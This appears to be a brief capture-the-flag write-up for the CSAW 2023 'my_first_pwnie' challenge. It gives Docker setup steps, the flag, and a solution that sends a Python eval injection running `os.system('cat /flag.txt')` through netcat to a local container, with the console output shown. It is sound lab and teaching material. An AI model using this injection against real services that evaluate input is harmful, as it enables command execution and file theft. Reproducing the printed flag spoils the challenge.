# my_first_pwnie

- source code: [CSAW-CTF-2023-Quals/pwn/my_first_pwnie at main · osirislab/CSAW-CTF-2023-Quals](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/pwn/my_first_pwnie)

## Setup

```bash
docker build -t csaw23/my_first_pwnie .
docker run --rm -p 31137:31137 csaw23/my_first_pwnie
```

## Flag

csawctf{neigh______}

## Solution

Input `eval("__import__('os').system('cat /flag.txt')")`.

```console
root@kali:~/ctf/CSAW-CTF-2023-Quals/pwn/my_first_pwnie# echo $'eval("__import__(\'os\').system(\'cat /flag.txt\')")' | nc localhost 31137
What's the password? csawctf{neigh______}
You entered `0`
Nay, that's not it.
```

## References

- [Bypass Python sandboxes - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#eval-ing-python-code)
